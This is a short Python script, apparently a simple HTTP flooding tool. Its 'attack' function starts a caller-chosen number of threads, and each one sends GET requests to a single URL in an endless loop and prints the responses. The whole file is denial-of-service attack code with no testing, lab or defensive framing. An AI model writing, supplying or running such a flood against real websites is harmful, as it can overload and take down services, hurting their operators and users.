import threading
import requests

url1 = ""

def do_request():
    while True:
        response = requests.get(url1).text
        print(response)
        

def attack(threadcount, urlname):

    print(threadcount)
    print(urlname)
    
    global url1
    url1 = urlname

    threads = []

    for i in range(threadcount):
        t = threading.Thread(target=do_request)
        t.daemon = True
        threads.append(t)

    for i in range(threadcount):
        threads[i].start()

    for i in range(threadcount):
        threads[i].join()